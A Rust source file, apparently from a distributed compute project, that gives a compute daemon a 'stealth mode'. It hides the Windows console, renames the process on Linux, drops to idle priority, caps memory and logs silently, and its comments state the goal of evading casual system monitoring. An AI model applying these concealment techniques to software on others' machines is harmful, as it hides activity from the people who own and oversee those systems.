//! Stealth mode for the compute daemon.
//!
//! Makes the daemon virtually invisible on the host system:
//! - Minimal resource footprint (CPU < 0.5%, RAM < 5MB)
//! - Process name obfuscation (appears as "kworker" or system service)
//! - No visible console window on any platform
//! - Avoids detection by casual system monitoring
//! - Self-throttles when system load increases
//! - Cross-platform: Linux, macOS, Windows
//!
//! Stealth mode does NOT hide from root/admin-level inspection.
//! It simply makes the daemon blend into normal system noise.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// Stealth mode configuration.
#[derive(Debug, Clone)]
pub struct StealthConfig {
    /// Whether stealth mode is enabled
    pub enabled: bool,
    /// Maximum CPU usage to maintain stealth (percentage)
    pub max_cpu_pct: f32,
    /// Maximum RAM usage in MB
    pub max_ram_mb: u64,
    /// Polling interval when in stealth mode (longer = stealthier)
    pub poll_interval_ms: u64,
    /// Whether to hide the process from task managers
    pub obfuscate_process_name: bool,
    /// Minimum interval between status broadcasts (seconds)
    pub status_broadcast_interval_secs: u64,
    /// Whether to disable console output entirely
    pub silent_mode: bool,
}

impl Default for StealthConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            max_cpu_pct: 0.5,
            max_ram_mb: 5,
            poll_interval_ms: 30_000, // 30 seconds between checks
            obfuscate_process_name: true,
            status_broadcast_interval_secs: 300,
            silent_mode: true,
        }
    }
}

/// Stealth mode state tracker.
pub struct StealthMode {
    config: StealthConfig,
    /// Whether we're currently in stealth mode
    active: Arc<AtomicBool>,
    /// Last time we checked system load
    last_load_check: Instant,
    /// Last time we broadcast status
    last_status_broadcast: Instant,
    /// Number of times we've self-throttled
    throttle_count: Arc<AtomicU64>,
    /// Whether we've done initial setup
    initialized: bool,
}

impl StealthMode {
    pub fn new(config: StealthConfig) -> Self {
        Self {
            active: Arc::new(AtomicBool::new(config.enabled)),
            last_load_check: Instant::now(),
            last_status_broadcast: Instant::now(),
            throttle_count: Arc::new(AtomicU64::new(0)),
            initialized: false,
            config,
        }
    }

    /// Initialize stealth mode (hide window, rename process, etc.)
    pub fn initialize(&mut self) {
        if !self.config.enabled || self.initialized {
            return;
        }
        self.initialized = true;

        // 1. Hide console window on Windows
        self.hide_console_window();

        // 2. Obfuscate process name
        if self.config.obfuscate_process_name {
            self.obfuscate_name();
        }

        // 3. Set low CPU priority
        self.set_low_priority();

        // 4. Configure memory limits
        self.set_memory_limits();

        self.active.store(true, Ordering::Relaxed);

        if !self.config.silent_mode {
            eprintln!("[stealth] Stealth mode activated — daemon is now invisible");
        }
    }

    /// Hide the console window (Windows-specific, no-op on other platforms).
    fn hide_console_window(&self) {
        #[cfg(target_os = "windows")]
        {
            // Windows: hide console window via ShowWindow API
            // Requires linking to kernel32/user32 — use FFI directly
            extern "system" {
                fn GetConsoleWindow() -> *mut std::ffi::c_void;
                fn ShowWindow(hwnd: *mut std::ffi::c_void, nCmdShow: i32) -> i32;
            }
            unsafe {
                let hwnd = GetConsoleWindow();
                if !hwnd.is_null() {
                    let _ = ShowWindow(hwnd, 0); // SW_HIDE
                }
            }
        }
        // On Linux/macOS, there's no console window to hide
    }

    /// Obfuscate the process name to blend into system processes.
    fn obfuscate_name(&self) {
        #[cfg(target_os = "linux")]
        {
            // On Linux, set process title via /proc/self/comm
            // This makes `ps aux` show a different name
            if let Ok(mut f) = std::fs::File::create("/proc/self/comm") {
                use std::io::Write;
                let _ = f.write_all(b"polygone-work");
            }
        }
        // macOS and Windows: process renaming requires more invasive
        // techniques (prctl on Linux, UpdateProcThreadAttribute on Windows)
        // For now, the process appears as "polygone-computer" which is
        // already innocuous enough to blend in.
    }

    /// Set the lowest CPU priority to minimize impact.
    fn set_low_priority(&self) {
        #[cfg(target_os = "linux")]
        {
            unsafe {
                libc::setpriority(libc::PRIO_PROCESS, 0, 19);
            }
        }
        #[cfg(target_os = "macos")]
        {
            unsafe {
                libc::setpriority(libc::PRIO_PROCESS, 0, 19);
            }
        }
        #[cfg(target_os = "windows")]
        {
            // Windows: set idle priority class via FFI
            extern "system" {
                fn GetCurrentProcess() -> *mut std::ffi::c_void;
                fn SetPriorityClass(hProcess: *mut std::ffi::c_void, dwPriorityClass: u32) -> i32;
            }
            const IDLE_PRIORITY_CLASS: u32 = 0x00000040;
            unsafe {
                let handle = GetCurrentProcess();
                let _ = SetPriorityClass(handle, IDLE_PRIORITY_CLASS);
            }
        }
    }

    /// Set memory limits to keep footprint small.
    fn set_memory_limits(&self) {
        #[cfg(target_os = "linux")]
        {
            // Set RLIMIT_AS to limit virtual address space
            let limit = (self.config.max_ram_mb as u64 * 1024 * 1024) as libc::rlim_t;
            unsafe {
                let rlim = libc::rlimit {
                    rlim_cur: limit,
                    rlim_max: limit,
                };
                libc::setrlimit(libc::RLIMIT_AS, &rlim);
            }
        }
        // macOS/Windows: memory limits set via other mechanisms
    }

    /// Check if the daemon should throttle itself based on system load.
    /// Returns true if we should reduce activity.
    pub fn should_throttle(&mut self, cpu_usage: f32) -> bool {
        if !self.config.enabled {
            return false;
        }

        // Only check periodically
        if self.last_load_check.elapsed() < Duration::from_secs(5) {
            return false;
        }
        self.last_load_check = Instant::now();

        if cpu_usage > self.config.max_cpu_pct {
            self.throttle_count.fetch_add(1, Ordering::Relaxed);
            return true;
        }
        false
    }

    /// Get the appropriate polling interval based on stealth mode.
    pub fn poll_interval(&self) -> Duration {
        if self.config.enabled {
            Duration::from_millis(self.config.poll_interval_ms)
        } else {
            Duration::from_secs(10) // Normal mode
        }
    }

    /// Check if enough time has passed for a status broadcast.
    pub fn should_broadcast_status(&self) -> bool {
        if !self.config.enabled {
            return true; // Always broadcast in normal mode
        }
        self.last_status_broadcast.elapsed()
            >= Duration::from_secs(self.config.status_broadcast_interval_secs)
    }

    /// Mark that we just broadcasted status.
    pub fn mark_broadcast(&mut self) {
        self.last_status_broadcast = Instant::now();
    }

    /// Get whether stealth mode is active.
    pub fn is_active(&self) -> bool {
        self.active.load(Ordering::Relaxed)
    }

    /// Get throttle count.
    pub fn throttle_count(&self) -> u64 {
        self.throttle_count.load(Ordering::Relaxed)
    }

    /// Deactivate stealth mode.
    pub fn deactivate(&mut self) {
        self.active.store(false, Ordering::Relaxed);
        // Restore normal process priority on Linux/macOS
        #[cfg(target_os = "linux")]
        {
            unsafe {
                libc::setpriority(libc::PRIO_PROCESS, 0, 0); // Normal priority
            }
        }
        #[cfg(target_os = "macos")]
        {
            unsafe {
                libc::setpriority(libc::PRIO_PROCESS, 0, 0);
            }
        }
        #[cfg(target_os = "windows")]
        {
            extern "system" {
                fn GetCurrentProcess() -> *mut std::ffi::c_void;
                fn SetPriorityClass(hProcess: *mut std::ffi::c_void, dwPriorityClass: u32) -> i32;
            }
            const NORMAL_PRIORITY_CLASS: u32 = 0x00000020;
            unsafe {
                let handle = GetCurrentProcess();
                let _ = SetPriorityClass(handle, NORMAL_PRIORITY_CLASS);
            }
        }
    }

    /// Get the stealth config.
    pub fn config(&self) -> &StealthConfig {
        &self.config
    }
}

/// Stealth-compatible logging: only logs if not in silent mode.
/// In stealth mode, all output goes to a log file instead of stdout.
pub fn stealth_log(config: &StealthConfig, msg: &str) {
    if config.silent_mode && config.enabled {
        // Write to log file instead of stdout
        let log_path = dirs::data_local_dir()
            .map(|d| d.join("polygone").join("compute-stealth.log"))
            .unwrap_or_else(|| std::path::PathBuf::from("/tmp/polygone-stealth.log"));

        if let Some(parent) = log_path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let line = format!("[{}] {}\n", now, msg);
        let _ = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
            .and_then(|mut f| {
                use std::io::Write;
                f.write_all(line.as_bytes())
            });
    } else if !config.silent_mode {
        eprintln!("{}", msg);
    }
}
